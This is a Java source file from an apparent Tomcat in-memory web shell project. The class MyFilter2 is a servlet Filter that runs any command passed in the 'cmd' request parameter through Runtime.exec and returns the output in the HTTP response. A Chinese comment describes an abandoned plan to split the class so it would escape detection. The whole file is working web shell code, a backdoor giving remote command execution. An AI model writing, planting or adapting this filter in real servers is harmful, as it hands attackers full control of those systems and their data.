package com.memeryShell.tomcat;

import javax.servlet.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

/*
* 荒废的玩意
* 本意是：Filter和DefineClass的类分开。抹除掉Filter即继承AbstractTranslet又实现Filter的特征
* 但是，由于会出现System ClassLoader加载不到类，且两个类合一起体积过大的问题
* 遂放弃
* */
public class MyFilter2 implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        if (servletRequest.getParameter("cmd") != null){
            String buffer = "";
            StringBuffer stringBuffer = new StringBuffer();
            InputStream cmdInputStrem = Runtime.getRuntime().exec(servletRequest.getParameter("cmd")).getInputStream();
            InputStreamReader inputStreamReader = new InputStreamReader(cmdInputStrem);
            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
            while ((buffer = bufferedReader.readLine()) != null){
                stringBuffer.append(buffer);
            }
            servletResponse.getWriter().write(stringBuffer.toString());
        }
    }

    @Override
    public void destroy() {

    }
}
